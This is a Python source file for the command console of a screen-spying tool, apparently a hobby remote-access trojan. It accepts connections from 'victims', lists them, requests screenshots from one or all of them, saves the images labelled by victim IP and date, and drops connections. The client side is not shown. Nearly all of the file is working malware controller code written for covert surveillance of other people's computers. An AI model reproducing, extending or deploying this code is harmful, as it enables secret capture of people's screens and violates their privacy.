##AUTOR: GUSTAVO ANDRE

import socket, threading, os, sys

class Serve:
    def __init__(self, limit_connection=2):
        port = 3500

        self.clients = []
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.bind(("localhost", port))
        self.s.listen(limit_connection)


    def recv_screenshot(self, client):
        obj, _from = client
        obj.send(b'screenshot')

        len_file = int(obj.recv(1024).decode())
        date_hour = obj.recv(1024).decode()
        len_data = 0
        new_file = open("images/victim {} {}.png".format(_from[0], date_hour), "wb")
        print("download screenshot: {}/{}".format(_from[0], _from[1]))
        while len_data < len_file:
            data = obj.recv(1024)
            len_data += len(data)
            new_file.write(data)
        new_file.close()

    def add_connections(self):
        try:        
            while True:
                client = self.s.accept()
                print("> another victim connected\n")
                self.clients.append(client)
        except: pass    

    def remove_connections(self, id):

        obj, _from = self.clients[id]
        obj.close()
        self.clients.pop(id)



if __name__ == '__main__':
    limit = int(input("limit of connection: "))
    serve = Serve(limit_connection=limit)
    HELP = """
command:

    screenshot - download victim's screenshot
    screenshot id - screenshot only of the victim corresponding to the id(victim index)

    exit - close connections with all victims
    close id - close connection only with the victim corresponding to the id(victim index)

    show - show the victims and their id
    clear - clear screen

    help - show command's
    """

    print(HELP)
    print("waiting for victim to connect...")
    connections = threading.Thread(target=serve.add_connections)
    connections.start()
    while True:
        
        option = input(">>> ")
        if(option == "screenshot"):    
            for client in serve.clients:
                serve.recv_screenshot(client)
        elif("screenshot" in option):
            id = int(option.split()[1])
            serve.recv_screenshot(serve.clients[id])
        elif(option == 'show'):
            for id,client in enumerate(serve.clients):
                print("[{}] - {}/{}".format(id, client[1][0], client[1][1]))
        elif(option == "clear"):
            os.system("cls")

        elif(option == "exit"):
            
            serve.s.close()
            exit(1)
            
        elif("close" in option):
            id = int(option.split()[1])
            serve.remove_connections(id)

        elif(option == "help"):
            print(HELP)

        elif(option == ""):
            continue
        else:
            print("wrong option :/")
